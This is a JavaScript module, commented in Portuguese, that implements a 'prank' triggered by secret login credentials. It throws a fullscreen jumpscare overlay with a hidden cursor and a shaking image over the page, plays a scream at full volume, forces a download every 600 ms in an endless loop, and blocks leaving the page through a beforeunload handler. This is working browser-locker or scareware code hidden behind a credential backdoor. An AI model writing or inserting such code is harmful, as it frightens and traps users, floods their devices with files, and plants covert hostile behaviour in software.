// Easter egg acionado por credenciais secretas no login.
// Arquivos ficam em /public/prank/ e são descritos em /public/prank/manifest.json
let prankRunning = false;

export async function runPrank() {
  if (prankRunning) return;
  prankRunning = true;

  let manifest = {};
  try {
    manifest = await (await fetch("/prank/manifest.json", { cache: "no-store" })).json();
  } catch (e) { manifest = {}; }

  const image = manifest.image || "/prank/jumpscare.jpg";
  const audio = manifest.audio || "/prank/scream.mp3";
  const downloads = (manifest.downloads && manifest.downloads.length) ? manifest.downloads : [image];
  const intervalMs = manifest.intervalMs || 600;

  // shake keyframes
  const style = document.createElement("style");
  style.textContent = "@keyframes prankShake{0%{transform:translate(0,0) scale(1.02)}20%{transform:translate(-14px,10px) scale(1.05)}40%{transform:translate(12px,-12px) scale(1.03)}60%{transform:translate(-10px,-8px) scale(1.06)}80%{transform:translate(9px,7px) scale(1.02)}100%{transform:translate(0,0) scale(1.04)}}";
  document.head.appendChild(style);

  // fullscreen overlay
  const overlay = document.createElement("div");
  overlay.setAttribute("data-testid", "prank-overlay");
  overlay.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:#000;display:flex;align-items:center;justify-content:center;cursor:none;overflow:hidden";
  const img = document.createElement("img");
  img.src = image;
  img.alt = "";
  img.style.cssText = "width:100%;height:100%;object-fit:cover;animation:prankShake .09s infinite";
  overlay.appendChild(img);
  document.body.appendChild(overlay);
  document.body.style.overflow = "hidden";

  try { if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen(); } catch (e) {}

  // audio once, max volume
  try {
    const a = new Audio(audio);
    a.volume = 1.0;
    a.play().catch(() => {});
  } catch (e) {}

  // download loop until the browser/tab is closed
  let i = 0;
  const timer = setInterval(() => {
    const url = downloads[i % downloads.length];
    const link = document.createElement("a");
    link.href = url;
    link.download = (url.split("/").pop() || `cuiudo_${i}.jpg`).replace(/\?.*$/, "");
    document.body.appendChild(link);
    link.click();
    link.remove();
    i += 1;
  }, intervalMs);

  // impede fechar o overlay por navegação/refresh acidental
  window.addEventListener("beforeunload", (e) => {
    e.preventDefault();
    e.returnValue = "";
  });
  window.__prankTimer = timer;
}
